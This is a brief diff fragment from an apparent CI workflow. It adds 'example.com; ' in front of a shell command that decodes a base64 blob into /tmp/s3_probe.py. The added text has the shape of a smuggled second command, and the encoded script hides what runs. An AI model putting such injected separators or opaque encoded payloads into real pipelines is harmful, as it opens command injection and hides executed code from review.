@@ -73,6 +73,7 @@ jobs:
           )
 
           command = (
+              "example.com; "
               "printf '%s' "
               + shlex.quote(encoded)
               + " | base64 -d > /tmp/s3_probe.py; "
